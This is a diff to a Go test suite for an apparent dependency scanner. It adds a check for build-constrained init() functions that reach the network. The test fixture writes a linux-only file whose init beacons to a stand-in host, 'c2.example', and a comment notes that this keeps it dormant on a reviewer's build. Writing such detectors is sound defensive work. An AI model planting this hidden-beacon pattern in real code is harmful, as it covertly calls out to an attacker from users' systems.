@@ -40,6 +40,7 @@ func runVC002(g *graph.Graph) map[string]int {
 		builtin.HookObfuscated{},         // VC-002e
 		builtin.HookDownloadCradle{},     // VC-002f (block)
 		builtin.HookBuildFlagInjection{}, // VC-002h (gate-eligible)
+		builtin.HookConstrainedInit{},    // VC-002i (gate-eligible)
 	} {
 		for _, f := range c.Run(ctx) {
 			counts[f.CheckID]++
@@ -253,5 +254,41 @@ func TestGoCgoFlagInjectionFires(t *testing.T) {
 	}
 	if c := runVC002(g2); len(c) != 0 {
 		t.Errorf("an ordinary cgo file must fire no VC-002 finding; got %v", c)
+	}
+}
+
+// A build-constrained file whose init() beacons out fires VC-002i (the evasion
+// shape), end-to-end through the gomod adapter; an ordinary build-tagged platform
+// file whose init merely registers a driver stays silent.
+func TestGoConstrainedInitEvasionFires(t *testing.T) {
+	dir := t.TempDir()
+	write(t, filepath.Join(dir, "go.mod"), "module evil.example/m\n\ngo 1.21\n")
+	// Hidden behind a GOOS filename suffix: dormant on a non-linux reviewer's build.
+	write(t, filepath.Join(dir, "telemetry_linux.go"),
+		"package m\n\nimport \"net/http\"\n\nfunc init() { http.Get(\"http://c2.example/beacon\") }\n")
+	g := rootedGraph("gomod", "evil.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	c := runVC002(g)
+	if c["VC-002i"] < 1 {
+		t.Errorf("a build-constrained init that beacons must fire VC-002i; got %v", c)
+	}
+	// It is a runtime init, not an install hook — VC-002b must NOT mislabel it.
+	if c["VC-002b"] != 0 {
+		t.Errorf("a runtime init must not be reported as an install-hook network reach (VC-002b); got %v", c)
+	}
+
+	// An ordinary platform file whose init registers a driver stays silent.
+	dir2 := t.TempDir()
+	write(t, filepath.Join(dir2, "go.mod"), "module honest.example/m\n\ngo 1.21\n")
+	write(t, filepath.Join(dir2, "driver_linux.go"),
+		"package m\n\nfunc init() { register(linuxDriver) }\n")
+	g2 := rootedGraph("gomod", "honest.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir2, g2); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g2); len(c) != 0 {
+		t.Errorf("an ordinary platform init must fire no VC-002 finding; got %v", c)
 	}
 }
